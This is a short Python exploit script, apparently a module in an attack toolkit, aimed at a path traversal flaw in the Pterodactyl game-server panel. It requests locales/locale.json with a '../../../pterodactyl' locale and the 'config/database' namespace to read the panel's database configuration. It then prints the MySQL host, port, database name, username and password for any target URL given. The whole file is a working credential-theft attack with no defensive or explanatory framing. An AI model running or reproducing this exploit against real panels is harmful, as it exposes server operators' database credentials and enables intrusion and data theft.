import requests
import json
from colorama import Fore, init
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def run(args):
    if len(args) == 0:
        print(Fore.RED + "[!] You must provide the target panel URL. Example: https://panel.minearg.com")
        return

    target = args[0].strip()
    if not target.endswith('/'):
        target += '/'

    url = f"{target}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

    try:
        r = requests.get(url, allow_redirects=True, timeout=5, verify=False)
        if r.status_code == 200 and "pterodactyl" in r.text.lower():
            try:
                raw_data = r.json()
                cfg = raw_data.get("../../../pterodactyl", {}).get("config/database", {}).get("connections", {}).get("mysql", {})
                host = cfg.get("host", "N/A")
                port = cfg.get("port", "N/A")
                database = cfg.get("database", "N/A")
                username = cfg.get("username", "N/A")
                password = cfg.get("password", "N/A")

                print(f"{Fore.LIGHTCYAN_EX}{target} => {username}:{password}@{host}:{port}/{database}{Fore.RESET}")

            except json.JSONDecodeError:
                print(Fore.RED + "Not vulnerable (Invalid JSON response)." + Fore.RESET)
            except Exception:
                print(Fore.LIGHTRED_EX + "Vulnerable but no database information found." + Fore.RESET)
        else:
            print(Fore.RED + "Not vulnerable or endpoint not accessible." + Fore.RESET)

    except requests.RequestException as e:
        if "NameResolutionError" in str(e):
            print(Fore.RED + "Invalid target or unable to resolve domain." + Fore.RESET)
        else:
            print(f"{Fore.RED}Request error: {e}{Fore.RESET}")
